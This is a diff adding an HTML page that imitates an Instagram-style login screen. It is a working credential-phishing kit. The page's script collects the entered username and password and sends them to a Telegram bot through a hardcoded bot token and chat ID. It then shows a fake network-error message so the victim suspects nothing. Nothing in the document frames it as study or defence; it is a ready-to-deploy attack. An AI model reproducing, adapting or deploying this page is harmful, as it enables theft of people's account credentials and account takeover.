@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Custom Message</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+    }
+
+    body {
+      background-color: #1a2730;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 15px 20px;
+    }
+
+    .top-bar {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-bottom: 50px;
+      text-align: center;
+      width: 100%;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 10px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 340px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .profile-img {
+      width: 100px;
+      height: 100px;
+      border-radius: 16px;
+      object-fit: cover;
+      margin-bottom: 40px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .input-box {
+      width: 100%;
+      background: transparent;
+      border: 1.5px solid #2d4250;
+      border-radius: 16px;
+      padding: 14px 18px;
+      font-size: 16px;
+      color: #ffffff;
+      outline: none;
+      margin-bottom: 15px;
+    }
+
+    .input-box::placeholder {
+      color: #ffffff;
+      opacity: 0.9;
+    }
+
+    .input-box:focus {
+      border-color: #0088cc;
+    }
+
+    .send-btn {
+      width: 100%;
+      background-color: #007aff;
+      color: #ffffff;
+      border: none;
+      border-radius: 25px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 5px;
+      margin-bottom: 15px;
+    }
+
+    .contact-link {
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 15px;
+      margin-top: 5px;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 13px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">English (UK)</div>
+
+  <div class="container">
+    <!-- Aap yahan apni photo ka link ya file name daal sakte hain -->
+    <img src="bed.jpg" alt="" class="profile-img">
+
+    <input type="text" id="username" class="input-box" placeholder="username, email adress or mobile number">
+    <input type="text" id="password" class="input-box" placeholder="password">
+
+    <button class="send-btn" onclick="sendToTelegram()">login</button>
+
+    <a href="#" class="contact-link">forgotten password?</a>
+
+    <p id="status"></p>
+  </div>
+
+  <script>
+    function sendToTelegram() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const status = document.getElementById("status");
+
+      if (! username.trim() && ! password.trim()) {
+        status.innerText = "Kripya message likhein.";
+        status.style.color = "#ff4d4d";
+        return;
+      }
+
+      const botToken = "7865804964:AAHPjacpfuxtkPyub9MMwdkXogXzAAYC0MM";
+      const chatId = "5036069509";
+
+      const fullMessage = "instagram:\nusername: " + username + "\nPassward: " + password;
+
+      status.innerText = "connecting...";
+      status.style.color = "#0088cc";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: fullMessage
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          status.innerText = "error please cheak your internet connection!";
+          status.style.color = "#00ff88";
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        } else {
+          status.innerText = "Bhejne me problem aayi.";
+          status.style.color = "#ff4d4d";
+        }
+      })
+      .catch(err => {
+        status.innerText = "Network error. Dubara try karein.";
+        status.style.color = "#ff4d4d";
+      });
+    }
+  </script>
+
+</body>
+</html>
